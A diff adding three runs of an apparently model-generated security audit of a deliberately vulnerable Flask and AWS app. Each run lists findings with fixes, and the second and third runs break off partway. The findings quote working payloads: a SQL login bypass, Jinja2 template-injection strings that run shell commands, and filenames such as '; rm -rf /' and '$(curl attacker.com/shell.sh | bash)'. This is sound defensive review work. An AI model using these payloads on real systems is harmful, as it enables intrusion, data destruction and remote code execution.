@@ -1,0 +1,2367 @@
+=== RUN 1 ===
+# Security Audit Report
+
+## Critical Vulnerabilities
+
+---
+
+### 1. SQL Injection
+**File:** `./app/routes/auth.py` — `login()` function
+**Severity:** Critical
+
+```python
+# VULNERABLE
+query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+result = db.session.execute(query)
+```
+
+Raw string concatenation allows an attacker to manipulate the query entirely. For example, a username of `' OR '1'='1' --` would bypass authentication.
+
+**Fix:** Use parameterised queries or the ORM:
+```python
+# Option 1: ORM (preferred)
+user = User.query.filter_by(username=username, password=hashed_password).first()
+
+# Option 2: Parameterised query
+query = text("SELECT * FROM users WHERE username = :username AND password = :password")
+result = db.session.execute(query, {"username": username, "password": hashed_password})
+```
+
+---
+
+### 2. Server-Side Template Injection (SSTI)
+**File:** `./app/routes/templates.py` — `render_template_custom()`
+**Severity:** Critical
+
+```python
+# VULNERABLE — unsandboxed Jinja2 environment with user input
+env = Environment()
+template = env.from_string(template_str)  # template_str is raw user input
+rendered = template.render(**context)
+```
+
+An attacker can execute arbitrary code on the server. A payload such as:
+```
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+```
+
+**Fix:** Use Jinja2's `SandboxedEnvironment` and strictly validate/whitelist inputs:
+```python
+from jinja2.sandbox import SandboxedEnvironment
+
+env = SandboxedEnvironment()
+template = env.from_string(template_str)
+rendered = template.render(**context)
+```
+Ideally, avoid rendering arbitrary user-supplied templates entirely.
+
+---
+
+### 3. OS Command Injection
+**File:** `./app/routes/files.py` — `process_file()`
+**Severity:** Critical
+
+```python
+# VULNERABLE — shell=True with unsanitised user input
+result = subprocess.run(
+    "file " + filename,   # filename is raw user input
+    shell=True,
+    capture_output=True,
+    text=True
+)
+```
+
+A filename of `; rm -rf /` or `$(curl attacker.com/shell.sh | bash)` executes arbitrary commands.
+
+**Fix:** Never use `shell=True` with user input. Pass arguments as a list:
+```python
+import shlex
+
+# Validate filename first
+if not re.match(r'^[\w\-. ]+$', filename):
+    return jsonify({"error": "Invalid filename"}), 400
+
+result = subprocess.run(
+    ["file", filename],   # list form, no shell interpolation
+    shell=False,
+    capture_output=True,
+    text=True
+)
+```
+
+---
+
+### 4. Plaintext Password Storage
+**File:** `./app/routes/auth.py` — `register()`
+**Severity:** Critical
+
+```python
+# VULNERABLE — password stored as plaintext
+user = User(username=username, password=password, email=email)
+```
+
+If the database is compromised, all user passwords are immediately exposed.
+
+**Fix:** Hash passwords with `bcrypt` or `werkzeug.security`:
+```python
+from werkzeug.security import generate_password_hash, check_password_hash
+
+# On registration
+user = User(username=username, password=generate_password_hash(password), email=email)
+
+# On login (ORM approach)
+user = User.query.filter_by(username=username).first()
+if user and check_password_hash(user.password, password):
+    token = generate_token(user.id)
+```
+
+---
+
+## High Vulnerabilities
+
+---
+
+### 5. Hardcoded Secrets
+**Files:** `./app/config.py`, `./app/routes/auth.py`
+**Severity:** High
+
+```python
+# config.py
+SECRET_KEY = "hardcoded-secret-key-123"
+
+# auth.py
+db_password = "supersecretdbpassword123"
+secret = "jwt-secret-key-hardcoded-2024"
+```
+
+Secrets committed to source control are permanently exposed, even after removal, due to git history.
+
+**Fix:** Load all secrets from environment variables:
+```python
+import os
+
+class Config:
+    SECRET_KEY = os.environ["SECRET_KEY"]
+    JWT_SECRET = os.environ["JWT_SECRET"]
+    SQLALCHEMY_DATABASE_URI = os.environ["DATABASE_URL"]
+```
+Use a `.env` file locally (excluded via `.gitignore`) and a secrets manager (e.g., AWS Secrets Manager) in production.
+
+---
+
+### 6. No Authentication or Authorisation on Any Route
+**Files:** `./app/routes/users.py`, `./app/routes/files.py`, `./app/routes/templates.py`
+**Severity:** High
+
+Every endpoint — including user deletion, file processing, and template rendering — is completely unauthenticated. Any anonymous request can:
+- List all users and their emails (`GET /users/`)
+- Delete any user (`DELETE /users/delete/<username>`)
+- Delete any file (`DELETE /files/delete/<id>`)
+- Execute server-side templates (see SSTI above)
+
+**Fix:** Implement a JWT verification decorator and apply it to protected routes:
+```python
+from functools import wraps
+from flask import request, jsonify
+import jwt
+
+def require_auth(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        token = request.headers.get("Authorization", "").removeprefix("Bearer ")
+        if not token:
+            return jsonify({"error": "Missing token"}), 401
+        try:
+            payload = jwt.decode(token, os.environ["JWT_SECRET"], algorithms=["HS256"])
+            request.user_id = payload["user_id"]
+        except jwt.ExpiredSignatureError:
+            return jsonify({"error": "Token expired"}), 401
+        except jwt.InvalidTokenError:
+            return jsonify({"error": "Invalid token"}), 401
+        return f(*args, **kwargs)
+    return decorated
+
+# Apply to routes
+@users_bp.route("/delete/<username>", methods=["DELETE"])
+@require_auth
+def delete_user(username):
+    ...
+```
+
+---
+
+### 7. Overly Permissive IAM Policy — Wildcard Administrator Access
+**File:** `./infrastructure/iam-policy.json`
+**Severity:** High
+
+```json
+{
+    "Sid": "AdministratorAccess",
+    "Effect": "Allow",
+    "Action": "*",
+    "Resource": "*"
+}
+```
+
+This grants full administrator access to every AWS service and resource. The subsequent, more specific statements are entirely redundant. A compromised identity with this policy can exfiltrate data, destroy infrastructure, create backdoor accounts, etc.
+
+**Fix:** Apply the principle of least privilege. Grant only the specific actions and resources the application actually needs:
+```json
+{
+    "Sid": "AppSpecificAccess",
+    "Effect": "Allow",
+    "Action": [
+        "s3:GetObject",
+        "s3:PutObject",
+        "s3:ListBucket"
+    ],
+    "Resource": [
+        "arn:aws:s3:::dissertation-bucket",
+        "arn:aws:s3:::dissertation-bucket/*"
+    ]
+}
+```
+
+---
+
+### 8. Debug Mode Enabled in Production Entry Point
+**File:** `./run.py`
+**Severity:** High
+
+```python
+app.run(debug=True)
+```
+
+Flask's debug mode enables the interactive Werkzeug debugger, which allows **arbitrary Python code execution** in the browser if an exception occurs. It also enables auto-reloading and exposes detailed stack traces.
+
+**Fix:**
+```python
+if __name__ == "__main__":
+    debug = os.environ.get("FLASK_ENV") == "development"
+    app.run(debug=debug)
+```
+In production, use a proper WSGI server (e.g., Gunicorn) and never set `debug=True`.
+
+---
+
+### 9. EC2 Instance Metadata Service (IMDSv1) Enabled
+**File:** `./infrastructure/main.tf`
+**Severity:** High
+
+```hcl
+metadata_options {
+    http_tokens = "optional"   # IMDSv1 allowed
+}
+```
+
+IMDSv1 is unauthenticated. Any SSRF vulnerability in the application can be used to query `http://169.254.169.254/` and steal IAM credentials attached to the instance role.
+
+**Fix:** Enforce IMDSv2 (token-required):
+```hcl
+metadata_options {
+    http_endpoint               = "enabled"
+    http_tokens                 = "required"   # IMDSv2 only
+    http_put_response_hop_limit = 1
+}
+```
+
+---
+
+## Medium Vulnerabilities
+
+---
+
+### 10. Publicly Accessible S3 Bucket
+**File:** `./infrastructure/main.tf`
+**Severity:** Medium
+
+```hcl
+resource "aws_s3_bucket_public_access_block" "public_bucket_access" {
+    block_public_acls       = false
+    block_public_policy     = false
+    ignore_public_acls      = false
+    restrict_public_buckets = false
+}
+```
+
+All four public-access block settings are disabled, making the bucket and its contents potentially world-readable.
+
+**Fix:** Unless static website hosting is explicitly required, block all public access:
+```hcl
+block_public_acls       = true
+block_public_policy     = true
+ignore_public_acls      = true
+restrict_public_buckets = true
+```
+
+---
+
+### 11. S3 Bucket Without Encryption
+**File:** `./infrastructure/main.tf` — `dissertation-unencrypted-bucket`
+**Severity:** Medium
+
+The `unencrypted_bucket` resource has no `aws_s3_bucket_server_side_encryption_configuration` block, leaving data stored at rest unencrypted.
+
+**Fix:** Add server-side encryption (as already done for `secure_bucket`):
+```hcl
+resource "aws_s3_bucket_server_side_encryption_configuration" "unencrypted_bucket_encryption" {
+    bucket = aws_s3_bucket.unencrypted_bucket.id
+    rule {
+        apply_server_side_encryption_by_default {
+            sse_algorithm = "AES256"
+        }
+    }
+}
+```
+
+---
+
+### 12. Overly Broad SecretsManager Permissions
+**File:** `./infrastructure/iam-policy.json`
+**Severity:** Medium
+
+```json
+{
+    "Sid": "SecretsManagerAccess",
+    "Action": [
+        "secretsmanager:GetSecretValue",
+        "secretsmanager:ListSecrets",
+        "secretsmanager:DeleteSecret"
+    ],
+    "Resource": "*"
+}
+```
+
+`DeleteSecret` on `Resource: "*"` allows deletion of any secret in the account. `ListSecrets` exposes the names and metadata of all secrets.
+
+**Fix:** Scope to specific secret ARNs and remove destructive permissions:
+```json
+{
+    "Sid": "SecretsManagerAccess",
+    "Action": ["secretsmanager:GetSecretValue"],
+    "Resource": "arn:aws:secretsmanager:eu-west-2:123456789012:secret:dissertation/*"
+}
+```
+
+---
+
+### 13. No Input Validation on File Upload
+**File:** `./app/routes/files.py` — `upload_file()`
+**Severity:** Medium
+
+```python
+filename = data.get("filename")
+file_record = File(filename=filename, uploaded_by=uploaded_by)
+```
+
+No validation is performed on `filename`. This enables path traversal strings (`../../etc/passwd`) to be stored in the database and later used in the command injection sink in `process_file()`.
+
+**Fix:**
+```python
+import re
+from pathlib import Path
+
+filename = data.get("filename", "")
+# Reject path traversal and shell metacharacters
+if not re.match(r'^[\w\-. ]+$', filename) or Path(filename).name != filename:
+    return jsonify({"error": "Invalid filename"}), 400
+```
+
+---
+
+### 14. Missing Input Validation on Auth Endpoints
+**File:** `./app/routes/auth.py` — `register()`
+**Severity:** Medium
+
+```python
+data = request.get_json()
+username = data.get("username")
+password = data.get("password")
+email = data.get("email")
+# No null checks, no length limits, no format validation
+user = User(username=username, password=password, email=email)
+```
+
+Missing validation allows null values, excessively long strings (potential DoS), and malformed emails to be inserted into the database.
+
+**Fix:**
+```python
+if not username or not password or not email:
+    return jsonify({"error": "All fields are required"}), 400
+if len(username) > 80 or len(password) > 128:
+    return jsonify({"error": "Input too long"}), 400
+if not re.match(r'^[^@]+@[^@]+\.[^@]+$', email):
+    return jsonify({"error": "Invalid email"}), 400
+```
+
+---
+
+## Low Vulnerabilities
+
+---
+
+### 15. JWT Secret Separate from Flask Secret Key
+**File:** `./app/routes/auth.py`
+**Severity:** Low
+
+Two different hardcoded secrets exist (`SECRET_KEY` in config and `jwt-secret-key-hardcoded-2024` in auth). Beyond the hardcoding issue (covered above), having an undocumented second secret makes rotation and auditing harder.
+
+**Fix:** Use a single secret loaded from the app config: `current_app.config["SECRET_KEY"]`.
+
+---
+
+### 16. Sensitive Data Exposure via User Listing
+**File:** `./app/routes/users.py` — `get_all_users()`
+**Severity:** Low
+
+```python
+@users_bp.route("/", methods=["GET"])
+def get_all_users():
+    users = User.query.all()
+    return jsonify([{"id": u.id, "username": u.username, "email": u.email, "role": u.role} ...])
+```
+
+An unauthenticated caller can enumerate all usernames, emails, and roles in the system.
+
+**Fix:** Require authentication (see issue #6) and consider whether bulk user enumeration should be an available operation at all.
+
+---
+
+## Summary Table
+
+| # | File | Issue | Severity |
+|---|------|-------|----------|
+| 1 | `auth.py` | SQL Injection in login | **Critical** |
+| 2 | `templates.py` | Server-Side Template Injection | **Critical** |
+| 3 | `files.py` | OS Command Injection | **Critical** |
+| 4 | `auth.py` | Plaintext password storage | **Critical** |
+| 5 | `config.py`, `auth.py` | Hardcoded secrets | **High** |
+| 6 | All routes | No authentication/authorisation | **High** |
+| 7 | `iam-policy.json` | Wildcard IAM administrator access | **High** |
+| 8 | `run.py` | Debug mode in production | **High** |
+| 9 | `main.tf` | IMDSv1 enabled on EC2 | **High** |
+| 10 | `main.tf` | Public S3 bucket | **Medium** |
+| 11 | `main.tf` | Unencrypted S3 bucket | **Medium** |
+| 12 | `iam-policy.json` | Overly broad Secrets Manager perms | **Medium** |
+| 13 | `files.py` | No filename validation | **Medium** |
+| 14 | `auth.py` | No input validation on registration | **Medium** |
+| 15 | `auth.py` | Redundant JWT secret | **Low** |
+| 16 | `users.py` | Unauthenticated user enumeration | **Low** |
+
+=== RUN 2 ===
+# Security Audit Report
+
+## Critical Vulnerabilities
+
+---
+
+### 1. SQL Injection
+**File:** `./app/routes/auth.py` — `login()` function
+**Severity:** Critical
+
+```python
+# VULNERABLE
+query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+result = db.session.execute(query)
+```
+
+Raw string concatenation of user input directly into a SQL query allows an attacker to manipulate the query logic entirely. For example, a username of `' OR '1'='1' --` would bypass authentication completely.
+
+**Fix:** Use parameterised queries:
+```python
+from sqlalchemy import text
+
+user = User.query.filter_by(username=username, password=password).first()
+# Or with raw SQL if needed:
+query = text("SELECT * FROM users WHERE username = :username AND password = :password")
+result = db.session.execute(query, {"username": username, "password": password})
+```
+
+---
+
+### 2. Server-Side Template Injection (SSTI)
+**File:** `./app/routes/templates.py` — `render_template_custom()`
+**Severity:** Critical
+
+```python
+# VULNERABLE
+env = Environment()
+template = env.from_string(template_str)  # template_str is raw user input
+rendered = template.render(**context)
+```
+
+A Jinja2 `Environment` with no sandboxing allows arbitrary code execution. An attacker can send:
+```
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+```
+
+**Fix:** Use Jinja2's `SandboxedEnvironment`, and even then treat this feature as high-risk. Consider removing user-controlled template rendering entirely:
+```python
+from jinja2.sandbox import SandboxedEnvironment
+
+env = SandboxedEnvironment()
+template = env.from_string(template_str)
+rendered = template.render(**context)
+```
+
+---
+
+### 3. OS Command Injection
+**File:** `./app/routes/files.py` — `process_file()`
+**Severity:** Critical
+
+```python
+# VULNERABLE
+result = subprocess.run(
+    "file " + filename,  # filename is raw user input
+    shell=True,          # shell=True makes this exploitable
+    capture_output=True,
+    text=True
+)
+```
+
+`shell=True` with unsanitised user input allows arbitrary command execution. A filename of `; rm -rf /` or `$(curl attacker.com/shell.sh | bash)` would execute on the server.
+
+**Fix:** Pass arguments as a list and never use `shell=True` with user input:
+```python
+import shlex
+
+# Validate filename first
+if not filename or '/' in filename or '..' in filename:
+    return jsonify({"error": "Invalid filename"}), 400
+
+result = subprocess.run(
+    ["file", filename],  # List form, no shell interpolation
+    shell=False,
+    capture_output=True,
+    text=True
+)
+```
+
+---
+
+### 4. Plaintext Password Storage
+**File:** `./app/routes/auth.py` — `register()`
+**Severity:** Critical
+
+```python
+# VULNERABLE
+user = User(username=username, password=password, email=email)
+```
+
+Passwords are stored in plaintext in the database. A database breach exposes every user's password directly.
+
+**Fix:** Hash passwords with `bcrypt` or `werkzeug.security`:
+```python
+from werkzeug.security import generate_password_hash, check_password_hash
+
+# On registration:
+user = User(username=username, password=generate_password_hash(password), email=email)
+
+# On login:
+user = User.query.filter_by(username=username).first()
+if user and check_password_hash(user.password, password):
+    token = generate_token(user.id)
+```
+
+---
+
+## High Vulnerabilities
+
+---
+
+### 5. Hardcoded Secrets
+**Files:** `./app/config.py`, `./app/routes/auth.py`
+**Severity:** High
+
+```python
+# config.py
+SECRET_KEY = "hardcoded-secret-key-123"
+
+# auth.py
+db_password = "supersecretdbpassword123"
+secret = "jwt-secret-key-hardcoded-2024"
+```
+
+Secrets committed to source control are permanently exposed — even if later removed, they remain in git history. Anyone with repository access can forge JWT tokens or access the database.
+
+**Fix:** Load all secrets from environment variables:
+```python
+import os
+
+class Config:
+    SECRET_KEY = os.environ["SECRET_KEY"]
+    JWT_SECRET = os.environ["JWT_SECRET"]
+    SQLALCHEMY_DATABASE_URI = os.environ["DATABASE_URL"]
+```
+Use a secrets manager (AWS Secrets Manager, HashiCorp Vault) in production and a `.env` file (git-ignored) in development.
+
+---
+
+### 6. No Authentication or Authorisation on Any Route
+**Files:** `./app/routes/users.py`, `./app/routes/files.py`, `./app/routes/templates.py`
+**Severity:** High
+
+Every endpoint — including user deletion, file processing, and template rendering — is completely unauthenticated. Any anonymous request can:
+- List all users and their emails (`GET /users/`)
+- Delete any user (`DELETE /users/delete/<username>`)
+- Delete any file (`DELETE /files/delete/<file_id>`)
+- Execute server-side templates (see SSTI above)
+
+**Fix:** Implement a JWT verification decorator and apply it to protected routes:
+```python
+import jwt
+from functools import wraps
+from flask import request, jsonify
+
+def require_auth(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        token = request.headers.get("Authorization", "").removeprefix("Bearer ")
+        if not token:
+            return jsonify({"error": "Missing token"}), 401
+        try:
+            payload = jwt.decode(token, os.environ["JWT_SECRET"], algorithms=["HS256"])
+            request.user_id = payload["user_id"]
+        except jwt.ExpiredSignatureError:
+            return jsonify({"error": "Token expired"}), 401
+        except jwt.InvalidTokenError:
+            return jsonify({"error": "Invalid token"}), 401
+        return f(*args, **kwargs)
+    return decorated
+
+# Apply to routes:
+@users_bp.route("/delete/<username>", methods=["DELETE"])
+@require_auth
+def delete_user(username):
+    ...
+```
+
+---
+
+### 7. Overly Permissive IAM Policy
+**File:** `./infrastructure/iam-policy.json`
+**Severity:** High
+
+```json
+{
+    "Sid": "AdministratorAccess",
+    "Effect": "Allow",
+    "Action": "*",
+    "Resource": "*"
+}
+```
+
+The first statement grants full administrator access to every AWS service and resource. The subsequent, more restrictive statements are entirely redundant — the wildcard already covers everything. This violates the principle of least privilege and means a compromised identity has unrestricted access to the entire AWS account.
+
+**Fix:** Remove the wildcard statement entirely and grant only the specific permissions actually required:
+```json
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "AllowEC2Describe",
+            "Effect": "Allow",
+            "Action": [
+                "ec2:DescribeInstances",
+                "ec2:DescribeSecurityGroups",
+                "ec2:DescribeVpcs"
+            ],
+            "Resource": "*"
+        },
+        {
+            "Sid": "AllowS3ReadAccess",
+            "Effect": "Allow",
+            "Action": ["s3:GetObject", "s3:ListBucket"],
+            "Resource": "arn:aws:s3:::dissertation-bucket/*"
+        }
+    ]
+}
+```
+
+---
+
+### 8. Publicly Accessible S3 Bucket
+**File:** `./infrastructure/main.tf`
+**Severity:** High
+
+```hcl
+resource "aws_s3_bucket_public_access_block" "public_bucket_access" {
+  block_public_acls       = false
+  block_public_policy     = false
+  ignore_public_acls      = false
+  restrict_public_buckets = false
+}
+```
+
+All four public access block settings are disabled, meaning the bucket and its contents can be made world-readable. S3 misconfigurations are a leading cause of data breaches.
+
+**Fix:** Unless serving a static website with a deliberate public policy, block all public access:
+```hcl
+resource "aws_s3_bucket_public_access_block" "public_bucket_access" {
+  block_public_acls       = true
+  block_public_policy     = true
+  ignore_public_acls      = true
+  restrict_public_buckets = true
+}
+```
+
+---
+
+### 9. EC2 Instance Metadata Service (IMDSv1) Enabled
+**File:** `./infrastructure/main.tf`
+**Severity:** High
+
+```hcl
+metadata_options {
+  http_endpoint               = "enabled"
+  http_tokens                 = "optional"  # IMDSv1 allowed
+  http_put_response_hop_limit = 1
+}
+```
+
+`http_tokens = "optional"` allows IMDSv1, which requires no authentication token. Combined with an SSRF vulnerability in the application, an attacker can query `http://169.254.169.254/latest/meta-data/iam/security-credentials/` to steal the instance's IAM credentials.
+
+**Fix:** Enforce IMDSv2 (token-required):
+```hcl
+metadata_options {
+  http_endpoint               = "enabled"
+  http_tokens                 = "required"  # IMDSv2 only
+  http_put_response_hop_limit = 1
+}
+```
+
+---
+
+## Medium Vulnerabilities
+
+---
+
+### 10. Unencrypted S3 Bucket
+**File:** `./infrastructure/main.tf` — `dissertation-unencrypted-bucket`
+**Severity:** Medium
+
+```hcl
+resource "aws_s3_bucket" "unencrypted_bucket" {
+  bucket = "dissertation-unencrypted-bucket"
+}
+# No encryption configuration attached
+```
+
+Data stored in this bucket is not encrypted at rest, violating most compliance frameworks (PCI-DSS, HIPAA, GDPR).
+
+**Fix:** Add server-side encryption (note AWS now enables SSE-S3 by default for new buckets, but it should be explicit in IaC):
+```hcl
+resource "aws_s3_bucket_server_side_encryption_configuration" "unencrypted_bucket_encryption" {
+  bucket = aws_s3_bucket.unencrypted_bucket.id
+  rule {
+    apply_server_side_encryption_by_default {
+      sse_algorithm = "AES256"
+    }
+  }
+}
+```
+
+---
+
+### 11. No Input Validation on File Upload
+**File:** `./app/routes/files.py` — `upload_file()`
+**Severity:** Medium
+
+```python
+filename = data.get("filename")
+file_record = File(filename=filename, uploaded_by=uploaded_by)
+```
+
+No validation is performed on `filename`. This enables path traversal payloads (`../../etc/passwd`) to be stored in the database and later used in the command injection sink in `process_file()`.
+
+**Fix:**
+```python
+import os
+import re
+
+SAFE_FILENAME_RE = re.compile(r'^[\w\-. ]+$')
+
+filename = data.get("filename", "")
+if not filename or not SAFE_FILENAME_RE.match(filename):
+    return jsonify({"error": "Invalid filename"}), 400
+filename = os.path.basename(filename)  # Strip any path components
+```
+
+---
+
+### 12. Unauthenticated Access to All User Data
+**File:** `./app/routes/users.py` — `get_all_users()`
+**Severity:** Medium
+
+```python
+@users_bp.route("/", methods=["GET"])
+def get_all_users():
+    users = User.query.all()
+    return jsonify([{"id": u.id, "username": u.username, "email": u.email, "role": u.role} ...])
+```
+
+Any unauthenticated request to `GET /users/` returns the full user list including emails and roles. This is a mass data exposure risk.
+
+**Fix:** Require authentication (see issue #6) and restrict this endpoint to admin roles only.
+
+---
+
+### 13. SecretsManager `DeleteSecret` Permission
+**File:** `./infrastructure/iam-policy.json`
+**Severity:** Medium
+
+```json
+{
+    "Sid": "SecretsManagerAccess",
+    "Action": [
+        "secretsmanager:GetSecretValue",
+        "secretsmanager:ListSecrets",
+        "secretsmanager:DeleteSecret"
+    ],
+    "Resource": "*"
+}
+```
+
+Granting `DeleteSecret` on `Resource: "*"` allows the identity to permanently destroy any secret in the account. This is a destructive permission that should almost never be granted to application roles.
+
+**Fix:** Remove `DeleteSecret` and scope the resource ARN to only the secrets this application needs:
+```json
+{
+    "Action": ["secretsmanager:GetSecretValue"],
+    "Resource": "arn:aws:secretsmanager:eu-west-2:123456789012:secret:dissertation/*"
+}
+```
+
+---
+
+### 14. Debug Mode Enabled in Production Entry Point
+**File:** `./run.py`
+**Severity:** Medium
+
+```python
+app.run(debug=True)
+```
+
+Flask's debug mode enables the interactive Werkzeug debugger, which provides a Python REPL in the browser on any unhandled exception. This allows arbitrary code execution if the application is accidentally run with this file in production.
+
+**Fix:**
+```python
+if __name__ == "__main__":
+    debug = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
+    app.run(debug=debug)
+```
+
+---
+
+## Low Vulnerabilities
+
+---
+
+### 15. JWT Algorithm Not Validated on Decode
+**File:** `./app/routes/auth.py`
+**Severity:** Low
+
+The `generate_token` function specifies `HS256`, but there is no corresponding `decode` call in the codebase that enforces the algorithm. If a decode is added later without specifying `algorithms=["HS256"]`, it may be vulnerable to the `alg: none` attack.
+
+**Fix:** Always explicitly specify allowed algorithms when decoding:
+```python
+jwt.decode(token, secret, algorithms=["HS256"])
+```
+
+---
+
+### 16. No Rate Limiting on Authentication Endpoints
+**File:** `./app/routes/auth.py`
+**Severity:** Low
+
+The `/auth/login` and `/auth/register` endpoints have no rate limiting, enabling brute-force and credential-stuffing attacks.
+
+**Fix:** Use `Flask-Limiter`:
+```python
+from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
+
+limiter = Limiter(get_remote_address, app=app, default_limits=["200 per day"])
+
+@auth_bp.route("/login", methods=["POST"])
+@limiter.limit("10 per minute")
+def login():
+    ...
+```
+
+---
+
+### 17. Missing `null` Checks on Request Body Fields
+**Files:** `./app/routes/auth.py`, `./app/routes/files.py`, `./app/routes/templates.py`
+**Severity:** Low
+
+```python
+data = request.get_json()
+username = data.get("username")  # data could be None if Content-Type is wrong
+```
+
+If the request body is not valid JSON, `get_json()` returns `None`, and calling `.get()` on `None` raises an unhandled `AttributeError`, potentially leaking stack trace information.
+
+**Fix:**
+```python
+data = request.get_json(silent=True)
+if not data:
+    return jsonify({"error": "Invalid JSON body"}), 400
+```
+
+---
+
+## Summary Table
+
+| # | File | Issue | Severity |
+|---|------|-------|----------|
+| 1 | `auth.py` | SQL Injection in login | **Critical** |
+| 2 | `templates.py` | Server-Side Template Injection | **Critical** |
+| 3 | `files.py` | OS Command Injection | **Critical** |
+| 4 | `auth.py` | Plaintext password storage | **Critical** |
+| 5 | `
+
+=== RUN 3 ===
+# Security Audit Report
+
+## Critical Vulnerabilities
+
+---
+
+### 1. SQL Injection
+**File:** `./app/routes/auth.py` — `login()` function
+**Severity:** Critical
+
+The login query is built via direct string concatenation with unsanitised user input:
+
+```python
+# VULNERABLE
+query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+result = db.session.execute(query)
+```
+
+An attacker can bypass authentication entirely with a payload like `' OR '1'='1' --`.
+
+**Fix:** Use parameterised queries:
+```python
+from sqlalchemy import text
+
+result = db.session.execute(
+    text("SELECT * FROM users WHERE username = :username AND password = :password"),
+    {"username": username, "password": password}
+)
+```
+Better still, use the ORM directly and store hashed passwords (see issue #3):
+```python
+user = User.query.filter_by(username=username).first()
+if user and bcrypt.check_password_hash(user.password, password):
+    ...
+```
+
+---
+
+### 2. Server-Side Template Injection (SSTI)
+**File:** `./app/routes/templates.py` — `render_template_custom()`
+**Severity:** Critical
+
+User-supplied template strings are rendered directly by Jinja2 with no sandboxing:
+
+```python
+# VULNERABLE
+env = Environment()          # No sandbox
+template = env.from_string(template_str)
+rendered = template.render(**context)
+```
+
+An attacker can achieve Remote Code Execution (RCE) with a payload such as:
+```
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+**Fix:** Use Jinja2's `SandboxedEnvironment` and strictly validate/whitelist templates. If user-defined templates are not a core requirement, remove the endpoint entirely:
+```python
+from jinja2.sandbox import SandboxedEnvironment
+
+env = SandboxedEnvironment()
+template = env.from_string(template_str)
+rendered = template.render(**context)
+```
+Note that even `SandboxedEnvironment` has had historical bypasses; the safest approach is to avoid rendering arbitrary user-supplied templates.
+
+---
+
+### 3. Plaintext Password Storage
+**File:** `./app/routes/auth.py` — `register()`
+**Severity:** Critical
+
+Passwords are stored in the database without any hashing:
+
+```python
+# VULNERABLE
+user = User(username=username, password=password, email=email)
+```
+
+A database breach exposes every user's password in plaintext.
+
+**Fix:** Hash passwords before storage using `bcrypt` or `argon2`:
+```python
+from flask_bcrypt import Bcrypt
+bcrypt = Bcrypt()
+
+# On register:
+hashed = bcrypt.generate_password_hash(password).decode("utf-8")
+user = User(username=username, password=hashed, email=email)
+
+# On login:
+if user and bcrypt.check_password_hash(user.password, password):
+    ...
+```
+
+---
+
+### 4. OS Command Injection
+**File:** `./app/routes/files.py` — `process_file()`
+**Severity:** Critical
+
+User-supplied `filename` is interpolated directly into a shell command:
+
+```python
+# VULNERABLE
+result = subprocess.run(
+    "file " + filename,   # shell=True makes this exploitable
+    shell=True,
+    ...
+)
+```
+
+An attacker can supply `; rm -rf /` or `$(curl attacker.com/shell.sh | bash)` as the filename.
+
+**Fix:** Pass arguments as a list and disable shell interpolation:
+```python
+import shlex
+
+# Validate filename first
+if not re.match(r'^[\w\-. ]+$', filename):
+    return jsonify({"error": "Invalid filename"}), 400
+
+result = subprocess.run(
+    ["file", filename],   # List form, no shell
+    shell=False,
+    capture_output=True,
+    text=True
+)
+```
+
+---
+
+## High Severity Vulnerabilities
+
+---
+
+### 5. Hardcoded Secrets
+**Files:** `./app/config.py`, `./app/routes/auth.py`
+**Severity:** High
+
+Multiple secrets are hardcoded directly in source code:
+
+```python
+# app/config.py
+SECRET_KEY = "hardcoded-secret-key-123"
+
+# app/routes/auth.py
+db_password = "supersecretdbpassword123"
+secret = "jwt-secret-key-hardcoded-2024"
+```
+
+Anyone with read access to the repository (including historical commits) has these credentials.
+
+**Fix:** Load all secrets from environment variables or a secrets manager:
+```python
+import os
+
+class Config:
+    SECRET_KEY = os.environ["FLASK_SECRET_KEY"]
+    JWT_SECRET  = os.environ["JWT_SECRET_KEY"]
+    SQLALCHEMY_DATABASE_URI = os.environ["DATABASE_URL"]
+```
+Rotate all currently exposed secrets immediately. Add a pre-commit hook (e.g., `detect-secrets` or `trufflehog`) to prevent future commits of secrets.
+
+---
+
+### 6. Missing Authentication on All Endpoints
+**Files:** `./app/routes/users.py`, `./app/routes/files.py`, `./app/routes/templates.py`
+**Severity:** High
+
+Every route — including destructive ones — is completely unauthenticated:
+
+```python
+# Anyone can delete any user
+@users_bp.route("/delete/<username>", methods=["DELETE"])
+def delete_user(username):
+    ...
+
+# Anyone can list all users and their emails/roles
+@users_bp.route("/", methods=["GET"])
+def get_all_users():
+    ...
+```
+
+**Fix:** Implement JWT verification as a decorator and apply it to protected routes:
+```python
+from functools import wraps
+import jwt
+from flask import request, jsonify
+
+def token_required(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        token = request.headers.get("Authorization", "").removeprefix("Bearer ")
+        if not token:
+            return jsonify({"error": "Token missing"}), 401
+        try:
+            payload = jwt.decode(token, os.environ["JWT_SECRET_KEY"], algorithms=["HS256"])
+            request.user_id = payload["user_id"]
+        except jwt.ExpiredSignatureError:
+            return jsonify({"error": "Token expired"}), 401
+        except jwt.InvalidTokenError:
+            return jsonify({"error": "Invalid token"}), 401
+        return f(*args, **kwargs)
+    return decorated
+
+# Apply to sensitive routes:
+@users_bp.route("/delete/<username>", methods=["DELETE"])
+@token_required
+def delete_user(username):
+    ...
+```
+
+---
+
+### 7. Insecure Direct Object Reference (IDOR) / Missing Authorisation
+**Files:** `./app/routes/users.py`, `./app/routes/files.py`
+**Severity:** High
+
+Even if authentication were added, there is no authorisation check — any authenticated user could delete any other user or any file:
+
+```python
+# No check that the requesting user owns this resource or is an admin
+def delete_user(username): ...
+def delete_file(file_id): ...
+```
+
+**Fix:** Enforce ownership or role checks:
+```python
+@users_bp.route("/delete/<username>", methods=["DELETE"])
+@token_required
+def delete_user(username):
+    requesting_user = User.query.get(request.user_id)
+    target_user = User.query.filter_by(username=username).first()
+
+    if requesting_user.role != "admin" and requesting_user.id != target_user.id:
+        return jsonify({"error": "Forbidden"}), 403
+    ...
+```
+
+---
+
